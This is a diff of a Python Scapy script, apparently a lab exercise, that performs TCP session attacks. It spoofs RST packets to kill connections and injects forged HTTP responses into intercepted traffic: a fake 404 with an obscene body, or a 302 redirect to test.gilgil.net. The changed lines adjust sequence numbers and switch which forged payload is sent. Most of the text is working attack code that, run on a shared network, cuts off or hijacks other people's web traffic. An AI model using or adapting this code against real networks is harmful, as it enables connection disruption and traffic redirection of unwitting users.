@@ -26,7 +26,13 @@ def send_backward_rst(pkt):
 
 
 def send_fakepkt(pkt):
-    fakeData = 'HTTP/1.1 404 Not Found\n\n'
+    fakeData = '''HTTP/1.1 404 Not Found\r
+    Server: Apache  
+    Content-Length: 10
+    Keep-Alive: timeout=5, max=100
+    Connection: Keep-Alive
+    Content-Type: text/html\r\n\r
+    FUCK YOU\r\n'''
     fakeData2 = 'HTTP/1.1 302 Found\r\nLocation: http://test.gilgil.net\n\n'
     fake = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
         dport=pkt[TCP].sport,
@@ -34,32 +40,37 @@ def send_fakepkt(pkt):
         flags="FA",
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload))
-    ) / fakeData
+    ) / fakeData2
+
     del fake[IP].chksum
     del fake[TCP].chksum
+    fake.show2()
     sendp(fake)
 
 
 def send_forward_rst(pkt):
+    print len(pkt[TCP].payload)
     fake = Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) / IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
         dport=pkt[TCP].dport,
         sport=pkt[TCP].sport,
         flags="RA",
-        seq=pkt[TCP].ack,
-        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
+        seq=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
     )
     del fake[IP].chksum
     del fake[TCP].chksum
+    fake.show2()
     sendp(fake)
 
 
 def attack(pkt):
     layer = pkt.payload
     if pkt[TCP].flags & 0x04 or pkt[TCP].flags & 0x01: return
+
     if pkt.getlayer(Raw) and isHttpRequest(layer.load):  # http
         print "[+]=========HTTP sending rst============"
         send_forward_rst(pkt)
         send_fakepkt(pkt)
+
     else:  # only tcp
         send_forward_rst(pkt)
         send_backward_rst(pkt)
